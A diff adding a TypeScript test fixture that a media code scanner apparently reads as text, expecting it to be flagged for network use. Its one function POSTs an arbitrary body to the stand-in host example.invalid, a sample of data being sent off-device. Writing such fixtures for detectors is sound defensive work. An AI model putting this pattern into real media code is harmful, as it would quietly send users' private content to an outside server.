@@ -1,0 +1,6 @@
+// fixture: network-fetch. Fictional family Asha; not compiled, read by test/media-ast-scan.test.ts as text.
+// as: apps/mobile/src/lib/media/fixture.ts
+// expect: network
+export async function upload(body: string) {
+  await fetch('https://example.invalid/asha', { method: 'POST', body });
+}
